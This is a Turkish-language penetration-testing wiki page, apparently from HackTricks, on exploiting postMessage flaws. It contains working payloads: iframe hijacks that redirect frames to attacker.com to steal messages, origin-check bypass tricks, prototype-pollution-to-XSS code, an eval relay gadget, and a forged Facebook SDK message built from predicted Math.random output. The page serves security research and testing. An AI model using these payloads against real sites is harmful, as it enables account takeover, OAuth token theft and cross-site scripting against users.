# PostMessage Zafiyetleri

{{#include ../../banners/hacktricks-training.md}}

## Gönder **PostMessage**

**PostMessage** aşağıdaki fonksiyonu bir mesaj göndermek için kullanır:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
**İkinci senaryoda**, **mesaj yalnızca o domaine gönderilebilir** (Window object'in origin'i farklı olsa bile).\
If the **wildcard** is used, **mesajlar herhangi bir domaine gönderilebilir**, and will be sent to the origin of the Window object.

### **targetOrigin** içindeki iframe ve wildcard'a saldırı

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) eğer `X-Frame-Header` koruması olmayan ve **iframed** edilebilen bir sayfa bulursanız ve bu sayfa **postMessage** ile **wildcard** (\*) kullanarak **hassas** mesaj gönderiyorsa, **iframe**'in **origin**'ini değiştirebilir ve bu **hassas** mesajı kontrolünüzdeki bir domaine **leak** edebilirsiniz.\
Dikkat: sayfa iframed edilebiliyorsa ama **targetOrigin** **wildcard yerine bir URL olarak ayarlanmışsa**, bu **numara işe yaramaz**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`**, JS tarafından **`postMessages`** bekleyen fonksiyonu tanımlamak için kullanılan fonksiyondur.\
Aşağıdaki gibi bir kod kullanılacaktır:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Bu durumda kodun yaptığı **ilk işlem**in **origin'i kontrol etmek** olduğunu unutmayın. Bu, sayfa alınan bilgiyle **herhangi bir hassas işlem** (ör. şifre değiştirme) yapacaksa son derece **önemlidir**. **Origin'i kontrol etmezse, saldırganlar kurbanları bu endpoints'e rastgele veri göndermeye zorlayabilir** ve kurbanların şifrelerini değiştirebilir (bu örnekte).

### Keşif

Mevcut sayfada **event listener** bulmak için:

- **JS kodunda ara** `window.addEventListener` ve `$(window).on` (_JQuery versiyonu_)
- **Geliştirici araçları konsolunda çalıştır**: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Tarayıcının geliştirici araçlarında** _Elements --> Event Listeners_ bölümüne git

![](<../../images/image (396).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) veya [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) gibi bir **tarayıcı uzantısı** kullanın. Bu uzantılar **tüm mesajları yakalar** ve size gösterir.

### Origin check bypasses

- **`event.isTrusted`** özniteliği, yalnızca gerçek kullanıcı eylemlerinden kaynaklanan olaylar için `True` döndürdüğü için güvenli kabul edilir. Doğru uygulandığında atlatması zordur, ancak güvenlik kontrollerinde önemi büyüktür.
- PostMessage olaylarında origin doğrulaması için **`indexOf()`** kullanımı atlatılmaya açık olabilir. Bu zafiyeti gösteren bir örnek:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()` içindeki **`search()`** metodu düzenli ifadeler (regex) için tasarlanmıştır, stringler için değil. Regexp olmayan bir şey geçirildiğinde içsel olarak regex'e dönüştürülür ve bu metodu potansiyel olarak güvensiz kılar. Regex'te nokta (.) joker karakter olduğu için, özel hazırlanmış domainlerle doğrulamanın atlatılmasına izin verir. Örnek:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** fonksiyonu, `search()` gibi regex ile işler. Regex yanlış yapılandırıldıysa atlatılmaya açık olabilir.
- **`escapeHtml`** fonksiyonu, karakterleri kaçışlayarak girdileri sanitize etmek için tasarlanmıştır. Ancak yeni bir kaçışlanmış obje oluşturmaz; mevcut objenin özelliklerini üzerine yazar. Bu davranış istismar edilebilir. Özellikle, bir obje kontrolünüz altındaki bir özelliğinin `hasOwnProperty`'yi tanımayacak şekilde manipüle edilebilmesi durumunda, `escapeHtml` beklenen şekilde çalışmaz. Aşağıdaki örnekler bunu gösterir:

- Beklenen Başarısızlık:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Kaçışı atlatma:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Bu zafiyet bağlamında, `File` objesi özellikle exploitable'dır çünkü `name` özelliği read-only'dur. Şablonlarda kullanıldığında bu özellik `escapeHtml` tarafından sanitize edilmez ve potansiyel güvenlik risklerine yol açar.

- JavaScript'teki `document.domain` özelliği, domain'i kısaltmak için bir script tarafından ayarlanabilir; bu, aynı üst domain içindeki daha gevşek same-origin policy uygulamasına izin verir.

### Origin-only trust + trusted relays

Eğer bir alıcı sadece **`event.origin`** kontrol ediyorsa (örn. `*.trusted.com`'a güveniyorsa) genellikle o origin üzerinde saldırgan kontrollü parametreleri `postMessage` ile verilen `targetOrigin`/`targetWindow`'a yansıtan bir **"relay" sayfası** bulabilirsiniz. Örneğin, sorgu parametrelerini alıp `{msg_type, access_token, ...}`'i `opener`/`parent`'a ileten marketing/analytics gadget'ları. Yapabilecekleriniz:

- **Kurban sayfayı `opener` olan bir popup/iframe'de açın** ki handler'ları kaydolssun (birçok pixel/SDK sadece `window.opener` varsa listener ekler).
- **Başka bir saldırgan penceresini trusted origin'deki relay endpoint'ine yönlendirin**, enjekte etmek istediğiniz mesaj alanlarını doldurarak (message type, tokens, nonces).
- Mesaj artık **trusted origin'den geldiği için**, sadece origin'e dayalı doğrulama geçer ve kurban listener'ında ayrıcalıklı işlemleri (durum değişiklikleri, API çağrıları, DOM yazımları) tetikleyebilirsiniz.

Gerçekte görülen kötüye kullanım örüntüleri:

- Analytics SDK'ları (örn. pixel/fbevents tarzı) `FACEBOOK_IWL_BOOTSTRAP` gibi mesajları alır, sonra **mesajda sağlanan token'ı kullanarak backend API'larını çağırır** ve istek gövdesine **`location.href` / `document.referrer`**'ı ekler. Eğer kendi token'ınızı sağlarsanız, bu token'ın istek geçmişinde/kayıtlarında bu istekleri okuyabilir ve kurban sayfanın URL/referrer'ında bulunan **OAuth kodlarını/token'larını** exfil yapabilirsiniz.
- Keyfi alanları `postMessage` içine yansıtan herhangi bir relay, ayrıcalıklı listener'lar tarafından beklenen mesaj tiplerini **spoof** etmenize izin verir. Zayıf input doğrulama ile birleştirildiğinde Graph/REST çağrılarına, özellik kilidi açmalarına veya CSRF-eşdeğer akışlara ulaşabilirsiniz.

Av ipuçları: sadece `event.origin` kontrol eden `postMessage` listener'larını listeleyin, sonra URL parametrelerini `postMessage` ile ileten **same-origin HTML/JS endpoint'leri** arayın (marketing önizlemeleri, login popup'ları, OAuth hata sayfaları). Her ikisini `window.open()` + `postMessage` ile birleştirerek origin kontrollerini atlayın.

### e.origin == window.origin atlatma

Bir web sayfasını %%%%%% kullanarak **sandboxed iframe** içinde gömülürken, iframe'in origin'inin `null` olarak ayarlanacağını anlamak önemlidir. Bu, özellikle **sandbox attributes** ve bunların güvenlik/fonksiyonellik üzerindeki etkileri söz konusu olduğunda kritik öneme sahiptir.

Sandbox attribute'a **`allow-popups`** eklediğinizde, iframe içinden açılan herhangi bir popup penceresi ebeveyninin sandbox kısıtlamalarını devralır. Bu, **`allow-popups-to-escape-sandbox`** attribute'u da dahil edilmediği sürece, popup penceresinin origin'inin de `null` olarak ayarlanacağı ve iframe'in origin'iyle aynı olacağı anlamına gelir.

Sonuç olarak, bu koşullar altında bir popup açıldığında ve iframe'den popup'a **`postMessage`** ile mesaj gönderildiğinde, gönderici ve alıcı tarafların origin'leri `null` olur. Bu durum **`e.origin == window.origin`**'ın true (`null == null`) olarak değerlendirilmesine yol açar; çünkü iframe ve popup aynı origin değeri olan `null`'ü paylaşır.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### e.source'ı atlatma

Bir mesajın dinlenen script'in bulunduğu aynı pencereden gelip gelmediğini kontrol etmek mümkündür (özellikle **Content Scripts from browser extensions** için, mesajın aynı sayfadan gönderilip gönderilmediğini kontrol etmek açısından ilginç):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Bir mesajın **`e.source`** değerini null yapmak için, **postMessage** **gönderen** ve **hemen silinen** bir **iframe** oluşturarak bunu zorlayabilirsiniz.

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Bu saldırıları gerçekleştirebilmek için ideal olarak **hedef web sayfasını** bir `iframe` içine yerleştirebilmelisiniz. Ancak `X-Frame-Header` gibi bazı header'lar bu **davranışı** **engelleyebilir**.\
Bu senaryolarda yine daha az gizli bir saldırı kullanabilirsiniz. Zafiyetli web uygulamasını yeni bir sekmede açıp onunla iletişim kurabilirsiniz:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Ana sayfayı engelleyerek çocuğa gönderilen mesajı çalmak

Aşağıdaki sayfada, veriler gönderilmeden önce **main** sayfayı **blocking** yaparak ve çocuğundaki bir **XSS in the child**'ı kötüye kullanarak **child iframe**'e gönderilen **sensitive postmessage data**'yı nasıl çalabileceğinizi ve veriler alınmadan önce bunları **leak the data** ile sızdırabileceğinizi görebilirsiniz:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe konumunu değiştirerek mesajı çalmak

Eğer X-Frame-Header olmayan ve içinde başka bir iframe barındıran bir web sayfasını iframe'leyebiliyorsanız, o child iframe'in konumunu değiştirebilirsiniz; böylece eğer iframe **wildcard** kullanılarak gönderilen bir **postmessage** alıyorsa, bir saldırgan bu iframe'in **origin**'ini kendisinin kontrol ettiği bir sayfaya değiştirerek mesajı çalabilir:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage ile Prototype Pollution ve/veya XSS

`postMessage` ile gönderilen veriler JS tarafından çalıştırılıyorsa, sayfayı iframe'leyip exploit'i `postMessage` ile göndererek **prototype pollution/XSS**'i istismar edebilirsiniz.

Birkaç **postMessage aracılığıyla çok iyi açıklanmış XSS** örneği şurada bulunabilir: [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

`postMessage` ile bir `iframe`'e gönderilen veriyi kullanarak önce **Prototype Pollution and then XSS**'i suistimal etmeye yönelik bir exploit örneği:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Daha **fazla bilgi** için:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Origin türetili script yükleme ve tedarik zinciri pivotu (CAPIG vaka çalışması)

`capig-events.js` sadece `window.opener` mevcut olduğunda bir `message` handler kaydetti. `IWL_BOOTSTRAP` sırasında `pixel_id`'yi kontrol etti fakat `event.origin`'i sakladı ve daha sonra `${host}/sdk/${pixel_id}/iwl.js`'i oluşturmak için kullandı.

<details>
<summary>Saldırgan kontrolündeki origin'i yazan handler</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Bir opener elde edin: ör. Facebook Android WebView'de `window.name`'i `window.open(target, name)` ile yeniden kullanarak pencerenin kendi opener'ı haline gelmesini sağlayın, sonra kötü amaçlı bir iframe'den bir mesaj gönderin.
2. Herhangi bir origin'den `IWL_BOOTSTRAP` göndererek `host = event.origin`'ı `localStorage`'a kalıcı hale getirin.
3. `/sdk/<pixel_id>/iwl.js`'yi CSP tarafından izin verilen herhangi bir origin'de barındırın (takeover/XSS/upload ile whitelistlenmiş bir analytics domain üzerinde). Ardından `startIWL()` gömülü sitede (ör. `www.meta.com`) saldırgan JS'i yükleyerek kimlik bilgili çapraz-origin çağrılarını ve hesap ele geçirmeyi mümkün kılar.

Doğrudan opener kontrolü mümkün değilse, sayfadaki üçüncü taraf bir iframe'in ele geçirilmesi yine hazırlanan `postMessage`'i parent'a göndererek saklanan host'u zehirlemeye ve script yüklemesini zorlamaya izin verdi.

**Backend-generated shared script → stored XSS:** plugin `AHPixelIWLParametersPlugin`, kullanıcı kural parametrelerini `capig-events.js`'e eklenen JS'e birleştiriyordu (ör. `cbq.config.set(...)`). `"]}` gibi breakout'lar enjekte ederek rastgele JS çalıştırılabiliyor ve bu shared script'i yükleyen tüm sitelere servis edilen paylaşılan script'te stored XSS oluşturuyordu.

### Trusted-origin allowlist bir sınır değildir

Sıkı bir `event.origin` kontrolü yalnızca **trusted origin saldırgan JS çalıştıramıyorsa** işe yarar. Ayrıcalıklı sayfalar üçüncü taraf iframe'leri gömüp `event.origin === "https://partner.com"`'un güvenli olduğunu varsaydığında, `partner.com` içindeki herhangi bir XSS parent'a açılan bir köprü olur:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Gerçek dünyada gözlemlenen saldırı deseni:

1. **Exploit XSS in the partner iframe** ve bir relay gadget bırakıp, böylece herhangi bir `postMessage` trusted origin içinde code exec'e dönüşür:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, ele geçirilmiş iframe'e, parent'a izin verilen bir mesaj türünü ileten JS gönderin. Mesaj `partner.com` kaynağından gelir, allowlist'i geçer ve güvensiz şekilde eklenen HTML taşır:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Parent, saldırgan HTML'sini enjekte eder ve bu da **parent origin içinde JS yürütümü** sağlar (ör. `facebook.com`), bu sayede OAuth kodları çalınabilir veya tam hesap ele geçirme akışlarına pivot yapılabilir.

Key takeaways:

- **Partner origin isn't a boundary**: "trusted" bir partner'deki herhangi bir XSS, saldırganların `event.origin` kontrollerini atlayan izin verilen mesajları göndermesine olanak tanır.
- Handler'lar partner kontrollü payload'ları **render** ediyorsa (ör. belirli mesaj tiplerinde `innerHTML`), partner'ın ele geçirilmesi same-origin DOM XSS'e dönüşür.
- Geniş bir **message surface** (çok sayıda tip, yapı doğrulaması yok) partner iframe ele geçirildiğinde pivot için daha fazla gadget sağlar.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Mesaj doğrulaması `Math.random()` ile üretilen bir “shared secret” kullandığında (örn. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) ve aynı helper ayrıca plugin iframe'lerine isim veriyorsa, PRNG çıktıları geri kazanılabilir ve trusted mesajlar sahte olarak üretilebilir:

- **Leak PRNG outputs via `window.name`:** SDK, plugin iframe'lerini `guid()` ile otomatik isimlendirir. Eğer top frame'i kontrol ediyorsanız, victim sayfayı iframe içinde yükleyip plugin iframe'ini kendi origin'inize yönlendirebilirsiniz (ör. `window.frames[0].frames[0].location='https://attacker.com'`) ve `window.frames[0].frames[0].name` okuyarak ham bir `Math.random()` çıktısı elde edebilirsiniz.
- **Force more outputs without reloads:** Bazı SDK'lar bir reinit yolu açar; FB SDK'da `{xfbml:1}` ile `init:post` tetiklemek `XFBML.parse()`'i zorlar, plugin iframe'ini yok edip yeniden oluşturur ve yeni isim/callback ID'leri üretir. Tekrarlı reinit gerekli olduğu kadar PRNG çıktısı üretir (callback/iframe ID'leri için ek dahili `Math.random()` çağrıları olduğunu unutmayın; bu yüzden çözücüler arasındaki değerleri atlamalı).
- **Trusted-origin delivery via parameter pollution:** Eğer bir first-party plugin endpoint, temizlenmemiş bir parametreyi cross-window payload içine yansıtıyorsa (örn. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), trusted `facebook.com` origin'ini korurken `&type=...&iconSVG=...` enjekte edebilirsiniz.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` ve birkaç değeri (ardışık olmasa bile) bir V8 `Math.random` predictor'a (örn. Z3-based) verin. Beklenen callback token'ı yerel olarak üreterek sahteleyin.
- **Trigger the sink:** postMessage verisini, köprünün `xd.mpn.setupIconIframe` dispatch etmesini sağlayacak şekilde hazırlayın ve `iconSVG` içine HTML enjekte edin (örn. URL-encoded `<img src=x onerror=...>`), böylece hosting origin içinde DOM XSS elde edersiniz; buradan same-origin iframe'ler (OAuth dialogs, arbiters, vb.) okunabilir.
- **Framing quirks help:** Zincir, framing gerektirir. Bazı mobile webview'larda `X-Frame-Options`, `frame-ancestors` bulunduğunda desteklenmeyen `ALLOW-FROM`'a düşebilir ve “compat” parametreleri izin veren `frame-ancestors` zorlayabilir, bu da `window.name` yan kanalı için imkan sağlar.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referanslar

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Uygulama için: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
